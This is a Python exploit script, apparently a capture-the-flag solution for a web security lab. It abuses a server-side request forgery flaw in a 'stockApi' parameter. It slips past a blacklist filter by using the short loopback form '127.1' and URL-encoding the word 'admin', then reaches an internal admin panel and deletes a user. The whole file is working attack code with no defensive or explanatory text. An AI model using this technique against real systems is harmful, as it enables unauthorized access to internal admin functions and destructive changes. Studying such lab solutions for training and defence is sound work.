import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http" : "http://127.0.0.1:8080",
    "https" : "http://127.0.0.1:8080"
}

def ssrf_blacklist_attack(url):
    stock_path = "/product/stock"

    delete_user_payload = {
        "stockApi" : "http://127.1/%61%64%6d%69%6e/delete?username=carlos"
    }

    delete_res = requests.post(url + stock_path, data = delete_user_payload, proxies = proxies, verify = False)

    admin_panel_payload = {
        "stockApi": "http://127.1/%61%64%6d%69%6e"
    } 

    admin_res = requests.post(url+stock_path, data= admin_panel_payload, proxies=proxies,verify=False)

    if "User deleted successfully!" in admin_res.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1]
    except IndexError:
        print("[-] invalid input")
        print("[-] usage: %s <url>" %sys.argv[0])

    attack_return = ssrf_blacklist_attack(url)

    if attack_return:
        print("[+] user successfully deleted")
        print("[+] exiting...")
    else:
        print("[-] attack failed")
        print("[-] user didnt got deleted")
        print("[-] exiting...")

    sys.exit(-1)